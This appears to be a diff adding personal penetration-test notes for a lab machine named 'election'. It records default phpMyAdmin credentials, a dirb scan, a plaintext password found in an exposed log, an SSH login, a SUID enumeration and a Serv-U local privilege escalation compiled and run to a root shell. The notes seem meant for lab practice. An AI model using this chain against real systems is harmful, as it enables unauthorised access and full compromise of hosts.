@@ -1,0 +1,191 @@
+
+
+
+http://192.168.195.211/phpmyadmin/index.php
+
+default creds
+root:toor
+
+
+logging in we find 
+newuser:password
+
+also
+id: 1234
+name: Love
+bb113886b0513a9d882e3caa5cd73314:Zxc123!@#
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://192.168.195.211/election
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Oct 11 05:53:33 2025
+URL_BASE: http://192.168.195.211/election/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.195.211/election/ ----
+==> DIRECTORY: http://192.168.195.211/election/admin/                                                               
+==> DIRECTORY: http://192.168.195.211/election/data/                                                                
++ http://192.168.195.211/election/index.php (CODE:200|SIZE:7003)                                                    
+==> DIRECTORY: http://192.168.195.211/election/js/                                                                  
+==> DIRECTORY: http://192.168.195.211/election/languages/                                                           
+==> DIRECTORY: http://192.168.195.211/election/lib/                                                                 
+==> DIRECTORY: http://192.168.195.211/election/media/                                                               
+==> DIRECTORY: http://192.168.195.211/election/themes/                                                              
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/ ----
+==> DIRECTORY: http://192.168.195.211/election/admin/ajax/                                                          
+==> DIRECTORY: http://192.168.195.211/election/admin/components/                                                    
+==> DIRECTORY: http://192.168.195.211/election/admin/css/                                                           
+==> DIRECTORY: http://192.168.195.211/election/admin/img/                                                           
+==> DIRECTORY: http://192.168.195.211/election/admin/inc/                                                           
++ http://192.168.195.211/election/admin/index.php (CODE:200|SIZE:8964)                                              
+==> DIRECTORY: http://192.168.195.211/election/admin/js/                                                            
+==> DIRECTORY: http://192.168.195.211/election/admin/logs/                                                          
+==> DIRECTORY: http://192.168.195.211/election/admin/plugins/                                                       
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/data/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/languages/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/lib/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/media/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/themes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/ajax/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/components/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/inc/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/logs/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://192.168.195.211/election/admin/plugins/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Sat Oct 11 05:57:45 2025
+DOWNLOADED: 9224 - FOUND: 2
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+http://192.168.195.211/election/admin/logs/system.log
+
+[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
+[2020-04-03 00:13:53] Love added candidate 'Love'.
+[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
+
+This log was available either by logging in to eLection with the info found originally, or by fuzzing
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh love@192.168.195.211
+love@192.168.195.211's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+471 packages can be updated.
+358 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2023.
+Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
+love@election:~$ 
+
+love@election:~$ sudo -l
+[sudo] password for love: 
+Sorry, user love may not run sudo on election.
+love@election:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/arping
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/sbin/pppd
+/usr/local/Serv-U/Serv-U
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/bin/fusermount
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/su
+...
+
+
+
+Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)
+
+love@election:/tmp/pwnkit$ nano servu.c
+love@election:/tmp/pwnkit$ gcc servu.c -o pe && ./pe
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+opening root shell
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+# 
+
+
